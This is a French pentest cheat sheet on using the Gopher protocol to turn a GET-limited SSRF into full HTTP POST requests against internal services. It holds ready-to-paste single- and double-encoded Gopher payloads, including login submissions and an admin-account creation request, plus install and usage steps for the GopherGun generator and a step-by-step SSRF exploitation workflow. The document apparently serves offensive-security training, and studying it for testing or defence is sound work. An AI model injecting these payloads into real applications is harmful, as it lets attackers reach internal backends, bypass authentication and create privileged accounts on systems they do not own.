# Gopher — Protocole & GopherGun

## 1. Concept

Gopher est un protocole réseau antérieur au web. Il est encore supporté par **curl** et exploitable dans les attaques SSRF pour **contourner la limitation GET** et envoyer des requêtes HTTP arbitraires (POST, PUT, headers custom, body).

**Cas d'usage :** 
SSRF limitée aux GET → utiliser Gopher pour envoyer un POST avec body et headers complets.

---

## 2. Format d'une URL Gopher

```
gopher://HOST:PORT/_PAYLOAD
               ↑       ↑
              port    le _ est le 1er char — il sera tronqué par le protocole
```

**Règle critique : le premier caractère du path est toujours supprimé.**
→ Utiliser `_` comme caractère sacrifié (convention standard).

---

## 3. Construire une requête GET via Gopher

### Requête HTTP GET classique :
```
GET /status HTTP/1.1
Host: 127.0.0.1
```

### Équivalent Gopher (encodage simple) :
```
gopher://127.0.0.1:80/_GET%20/status%20HTTP/1.1%0a
```

| Caractère      | Encodé   |
|----------------|----------|
| espace         | `%20`    |
| `\n` (newline) | `%0a`    |
| `\r\n` (CRLF)  | `%0d%0a` |

### Tester avec curl + listener netcat :
```bash
# Terminal 1 — listener
nc -nvlp 9000

# Terminal 2 — envoyer
curl gopher://127.0.0.1:9000/_GET%20/status%20HTTP/1.1%0a
```

---

## 4. Construire une requête POST via Gopher

C'est là que Gopher devient puissant : envoyer un POST complet avec body.

### Structure HTTP POST à reproduire :
```
POST /login HTTP/1.1
Host: backend
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

username=white.rabbit&password=dontbelate
```

### Encodage manuel (simple — pour curl direct) :
```
gopher://backend:80/_POST%20/login%20HTTP/1.1%0d%0aContent-Type%3A%20application/x-www-form-urlencoded%0d%0aHost%3A%20backend%0d%0aContent-Length%3A%2041%0d%0a%0d%0ausername%3Dwhite.rabbit%26password%3Ddontbelate
```

---

## 5. Le piège du double encodage

Quand le payload Gopher passe **par un navigateur** (champ URL d'une app SSRF), le navigateur encode les `%` en `%25` → **double encodage**.

| Context                      | Espace encodé | % encodé |
|------------------------------|---------------|----------|
| curl direct                  | `%20`         | `%25`    |
| Via navigateur/Burp Repeater | `%2520`       | `%2525`  |

**Règle :**

- Payload dans **curl** directement → encodage simple (`%20`)
- Payload dans un **champ URL d'une app** (SSRF via navigateur ou Burp) → double encodage (`%2520`)

### Exemple double encodage (pour injecter dans un paramètre SSRF via Burp) :
```
gopher%3A//backend%3A80/_POST%2520%252Flogin%2520HTTP%252F1.1%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250AContent-Length%253A%252041%250D%250A%250D%250Ausername%253Dwhite.rabbit%2526password%253Ddontbelate
```

---

## 6. GopherGun — Génération automatique de payloads

**Repo :** https://github.com/EragonKashyap11/GopherGun

GopherGun génère automatiquement le payload Gopher correctement encodé (double encodage inclus) à partir d'une requête HTTP décrite interactivement.

### Installation :
```bash
git clone https://github.com/EragonKashyap11/GopherGun
cd GopherGun
pip3 install -r requirements.txt --break-system-packages
```

### Utilisation interactive :
```bash
python3 GopherGun.py
```

```
--- Gopher Payload Generator (Interactive Mode) ---

Enter the HTTP method (GET, POST, PUT): POST
Enter the target host (e.g., 127.0.0.1): localhost
Enter the target port (e.g., 80): 80
Enter the request path (e.g., /index.php): /api/admin/create

Enter HTTP headers, one per line. Press Enter on empty line to finish:
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
[Enter]

Enter the data for the request body:
username=admin&password=password
```

**Output produit :**
```
gopher%3A//localhost%3A80/_POST%2520%252Fapi%252Fadmin%252Fcreate%2520HTTP%252F1.1%250D%250AHost%253A%2520localhost%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%253Bcharset%253DUTF-8%250D%250AContent-Length%253A%252032%250D%250A%250D%250Ausername%253Dadmin%2526password%253Dpassword
```

→ Coller directement dans le champ URL vulnérable de l'app SSRF.

### Points d'attention GopherGun :
- Le payload est **doublement encodé** → prêt pour injection dans un paramètre via navigateur ou Burp
- Bien renseigner le `Content-Length` exact (compter les bytes du body)
- Si le Content-Length est faux → la requête sera rejetée ou tronquée

### Calculer Content-Length :
```bash
echo -n "username=admin&password=password" | wc -c
# → 32
```

---

## 7. Workflow SSRF + Gopher

```
1. Confirmer la SSRF (callback vers Kali)
2. Identifier l'endpoint interne cible (GET d'abord)
   → http://backend/ → liste des endpoints
3. Déterminer si POST nécessaire (auth, création de ressource...)
4. Récupérer la structure de la requête POST attendue
   (via Burp sur l'app légitime, ou doc API)
5. Calculer le Content-Length exact du body
6. Générer le payload avec GopherGun
7. Injecter dans le champ SSRF → observer la réponse
8. Ajuster si erreur (Content-Length, encodage, headers manquants)
```

---

## 8. Référence encodage Gopher

| Caractère | URL encodé |
|-----------|------------|
| espace    | `%20`      |
| `/`       | `%2F`      |
| `:`       | `%3A`      |
| `&`       | `%26`      |
| `=`       | `%3D`      |
| `\r` (CR) | `%0D`      |
| `\n` (LF) | `%0A`      |
| CRLF      | `%0D%0A`   |
| `%`       | `%25`      |

**Double encodage** (quand le `%` lui-même est encodé) :

| Simple | Double |
|--------|--------|
| `%20`  | `%2520` |
| `%2F`  | `%252F` |
| `%0D%0A` | `%250D%250A` |